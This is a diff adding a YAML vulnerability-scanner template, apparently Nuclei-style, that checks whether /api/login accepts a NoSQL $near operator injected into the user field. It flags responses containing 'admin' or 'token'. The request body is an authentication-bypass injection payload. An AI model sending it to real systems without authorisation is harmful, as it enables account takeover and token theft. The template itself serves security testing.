@@ -1,0 +1,19 @@
+id: nosql2-262
+name: 'NoSQL $near in user'
+severity: high
+type: active
+tags:
+  - nosql
+  - injection
+  - api
+description: 'NoSQL operator $near accepted on /api/login'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/login'
+    body: '{"user":{"$near":""},"extra":"x"}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'admin'
+          - 'token'
